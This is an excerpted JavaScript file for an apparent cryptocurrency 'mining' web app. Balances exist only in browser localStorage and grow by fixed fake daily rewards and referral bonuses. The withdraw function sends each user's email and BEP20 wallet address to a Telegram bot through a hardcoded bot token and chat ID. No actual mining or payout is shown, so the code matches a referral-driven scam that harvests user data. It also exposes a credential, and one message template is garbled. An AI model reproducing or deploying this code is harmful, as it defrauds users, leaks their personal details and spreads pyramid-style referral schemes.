(function () {
    ...
    const BOT_TOKEN = '8968905065:AAG1ruOvXgTB6o5Y6H28_V4fcaaJiCxeWO8';
    const CHAT_ID = '8543556639';
    const TELEGRAM_API = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';

    const CONVERSION_RATE = 0.00005;
    const MIN_WITHDRAW_USDT = 10;
    const MIN_WITHDRAW_BAM = MIN_WITHDRAW_USDT / CONVERSION_RATE; // 200000 LUNC
    const MINING_DAYS_TO_MIN = 7;
    const REFERRAL_TARGET = 10;
    const REFERRAL_REWARD_BAM = 20000;
    const DAILY_REWARD_BAM = 28571.43; // 7 days ≈ 200000 LUNC
    const COOLDOWN_HOURS = 24;

    function getAccounts() {
        try {
            return JSON.parse(localStorage.getItem('lunc_accounts') || '{}');
        } catch { return {}; }
    }
    function saveAccounts(accounts) {
        localStorage.setItem('lunc_accounts', JSON.stringify(accounts));
    }
    function getUserData(gmail) {
        try {
            return JSON.parse(localStorage.getItem('lunc_user_' + gmail) || 'null');
        } catch { return null; }
    }
    function saveUserData(gmail, data) {
        localStorage.setItem('lunc_user_' + gmail, JSON.stringify(data));
    }
    ...
    loginBtn.addEventListener('click', (e) => {
        ...
        userData = data;
        currentUser = gmail;
        localStorage.setItem('lunc_current_user', currentUser);
    ...
    function updateDashboard() {
        if (!userData) return;
        const balance = userData.balance || 0;
        balanceDisplay.innerHTML = balance.toFixed(2) + ' <small>LUNC</small>';
        ...
        if (accounts[currentUser]) {
            refCodeDisplay.textContent = accounts[currentUser].refCode || 'LUNC-XXXX';
        }
    ...
    async function mineBambacoin() {
        ...
        if (boosted) {
            setDashStatus(`🎉 7 days complete! Balance raised to ${MIN_WITHDRAW_BAM.toLocaleString()} LUNC. You can withdraw!`, 'success');
        } else {
            setDashStatus(`✅ +${DAILY_REWARD_BAM.toFixed(2)} LUNC added (Day ${userData.miningDays} of 7). Next mine in 24 h.`, 'success');
        }
    }
    ...
    function addReferral(code) {
        ...
        updateDashboard();
        if (boosted) {
            setDashStatus(`🎉 10 referrals reached! Balance raised to ${MIN_WITHDRAW_BAM.toLocaleString()} LUNC.`, 'success');
        } else {
            setDashStatus(`👤 Referral successful! +${REFERRAL_REWARD_BAM.toLocaleString()} LUNC added.`, 'success');
        }
        return true;
    }
    ...
    async function withdraw() {
        ...
        const msg = `💰 *Withdrawal Request* 💰\n\n` +
            `📧 *User:* \`${currentUser}\`\n` +
            `💵 *Amount:* \( {usdtValue.toFixed(4)} USDT ( \){balance.toFixed(2)} LUNC)\n` +
            `📍 *BEP20 Address:* \`${addr}\`\n` +
            `📊 *Status:* PENDING\n\n` +
            `🤖 *LUNC withdrawal*  ✨`;
    ...
    document.getElementById('copyRefBtn').addEventListener('click', () => {
        const accounts = getAccounts();
        const code = currentUser && accounts[currentUser] ? accounts[currentUser].refCode : 'LUNC-XXXX';
    ...
    logoutBtn.addEventListener('click', () => {
        localStorage.removeItem('lunc_current_user');
        currentUser = null;
        userData = null;
    ...
    const savedUser = localStorage.getItem('lunc_current_user');
    if (savedUser) {
